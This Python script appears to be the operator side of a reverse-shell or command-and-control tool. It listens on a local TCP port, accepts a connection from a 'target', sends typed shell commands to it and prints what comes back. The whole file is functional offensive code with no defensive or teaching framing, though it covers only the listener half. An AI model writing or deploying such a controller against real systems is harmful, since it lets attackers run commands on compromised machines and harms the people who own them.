import socket

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# carryout port binding
server_socket.bind(('127.0.0.1', 9000))

# listen for incoming connection
server_socket.listen()
print('[+} Controller is listening for incoming connections...')

try:

    # This blocks until a connection is received
    connection, address = server_socket.accept()
    print(f"[+] Connected to {address}")

    while True:
        CMD = input(f"{address}: shell/> ").encode()

        # We send the command to the target
        connection.sendall(CMD)
        ##print(f"[+] Sent payload to {address}")

        response = connection.recv(2048).decode('utf-8')
        print(response)

except Exception as e:

    server_socket.close()
    print(e)

finally:

    # clean up the connection
    if 'connection' in locals():
        connection.close()

